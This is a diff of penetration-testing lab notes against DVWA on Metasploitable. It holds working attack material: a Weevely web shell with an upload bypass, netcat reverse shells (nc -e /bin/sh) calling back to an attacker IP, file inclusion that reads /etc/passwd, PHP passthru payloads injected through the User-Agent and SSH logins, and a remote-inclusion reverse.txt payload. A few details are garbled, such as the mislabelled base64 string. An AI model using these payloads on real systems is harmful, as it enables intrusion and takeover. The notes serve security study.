@@ -2,13 +2,13 @@
 Information Gathering
 --------------------
 
-Gathering target website's info by the following
+"Gathering target website's info by the following"
 
 whois.domaintools.com
 toolbar.netcraft.com/site_report?url=
 www.robtex.com
 
-To find subdomains of target - https://github.com/guelfoweb/knock.git
+"To find subdomains of target - https://github.com/guelfoweb/knock.git"
 
 > chmod -R 755 knock
 > sudo su
@@ -132,7 +132,7 @@ To build up social engineering map use - Maltego
 File Upload Vulnerabilities
 ---------------------------
 
-Required Tools - Metasploitable 2, DVWA, Weevely
+"Required Tools - Metasploitable 2, DVWA, Weevely"
 
 > weevely --version
 
@@ -151,7 +151,7 @@ Required Tools - Metasploitable 2, DVWA, Weevely
 
 > weevely generate [password] [path]/[file_name].php
 
-Upload file to target, it can see uploaded URI/URL in page because it is lab page.
+"Upload file to target, it can see uploaded URI/URL in page because it is lab page."
 
 > weevely [target_address]/dvwa/hackable/uploads/[file_name].php [password]
 
@@ -233,22 +233,22 @@ The remote script execution triggers an error 500, check script and payload inte
 Intercepting Requests
 --------------------
 
-Used tool - Burp Suite
+"Used tool - Burp Suite"
 
-It is GUI tool.
+"It is GUI tool."
 
-Setup using Burp Suite as proxy in Firefox.
+"Setup using Burp Suite as proxy in Firefox."
 
-Bypass file uploading by uploading file extension as [file_name].php.jpg
+"Bypass file uploading by uploading file extension as [file_name].php.jpg"
 
-So, it will execute as this - weevely [target_address]/dvwa/hackable/uploads/[file_name].php.jpg [password]
+"So, it will execute as this => weevely [target_address]/dvwa/hackable/uploads/[file_name].php.jpg [password]"
 
 Code Execution Vulnerability
 ---------------------------
 
-Used tool - Net Cat
+"Used tool - Net Cat"
 
-Type the following in Hacker' machine
+"Type the following in Hacker' machine"
 
 > nc -vv -l -p 8080
 
@@ -261,13 +261,137 @@ connect to [192.168.104.3] from (UNKNOWN) [192.168.104.6] 34553
 > ls
 > cd ..
 
-Execute the following in Target server
+"Execute the following in Target server"
 
 > [your_ip_address] nc -e /bin/sh [your_ip_address] 8080
 
 or
 
 > [your_ip_address] | nc -e /bin/sh [your_ip_address] 8080
+
+Local File Inclusion Vulnerability
+---------------------------------
+
+"Used tool - Net Cat, Burp Suit"
+
+"Allow attacker to read any file on the same server."
+"Access file outside www directory."
+
+> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=include.php
+
+> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=[file_name].php
+
+"If it include file that do not exit, it will show error message as below."
+
+Warning: include(include1.php) [function.include]: failed to open stream: No such file or directory in /var/www/dvwa/vulnerabilities/fi/index.php on line 35
+
+Warning: include() [function.include]: Failed opening 'include1.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear:../../external/phpids/0.6/lib/') in /var/www/dvwa/vulnerabilities/fi/index.php on line 35
+
+Warning: Cannot modify header information - headers already sent by (output started at /var/www/dvwa/vulnerabilities/fi/index.php:35) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324
+
+Warning: Cannot modify header information - headers already sent by (output started at /var/www/dvwa/vulnerabilities/fi/index.php:35) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325
+
+Warning: Cannot modify header information - headers already sent by (output started at /var/www/dvwa/vulnerabilities/fi/index.php:35) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326
+
+> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false
+Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324
+
+Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325
+
+Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326
+
+"Try to inject code into readable files."
+
+/proc/self/environ
+/var/log/auth.log
+/var/log/apache2/access.log
+
+> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=/var/log/auth.log
+
+"Let intercept by using Burp Suit"
+
+> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=/proc/self/environ
+
+"While Intercepting, Put that code in User Agent in Burp Suite => <?phpinfo();?>"
+
+"While Intercepting, Put that code in User Agent in Burp Suite => <?passthru("nc -e /bin/sh [your_ip_address] 8888");?> for Explotation"
+
+> nc -vv -l -p 8888
+
+listening on [any] 8888 ...
+
+192.168.104.6: inverse host lookup failed: Unknown host
+connect to [192.168.104.3] from (UNKNOWN) [192.168.104.6] 46580
+ls
+help
+include.php
+index.php
+source
+
+"Encode this as Base64 => nc -e /bin/sh [your_ip_address] 8000"
+
+"Decoded string => bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEwNC42IDgwMDA="
+
+> ssh [user_name]@[target_ip]
+
+"Sure you don't have target username and password"
+
+"You can execute the following code"
+
+> ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjEwNC42IDgwMDA='));?>"@192.168.104.6
+
+Remote File Inclusion Vulnerability
+---------------------------------
+
+"Allow an attacker to read, execute any file from any server."
+"Store php files on other server server as txt."
+
+"Imagine you can access target server via ssh"
+
+> ssh [user_name]@[target_ip]
+
+> vim /etc/php5/cgi/php.ini
+
+"Make sure in /etc/php5/cgi/php.ini file => allow_url_include = On"
+
+> http://192.168.104.6/dvwa/vulnerabilities/fi/?page=http://192.168.104.3/index.html
+
+"Write this in reverse.txt => <?passthru("nc -e /bin/sh [your_ip_address] 8888");?>"
+
+"Put revere.txt under /var/www/html"
+
+> nc -vv -l -p 8888
+
+listening on [any] 8888 ...
+192.168.104.6: inverse host lookup failed: Unknown host
+connect to [192.168.104.3] from (UNKNOWN) [192.168.104.6] 53985                                                            
+ls                                                                                                                         
+help                                                                                                                       
+include.php
+index.php
+source
+
+"Bypassing remote file inclusion as (hTTp://...) => hTTp://192.168.104.6/dvwa/vulnerabilities/fi/?page=hTTp://192.168.104.3/reverse.txt"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
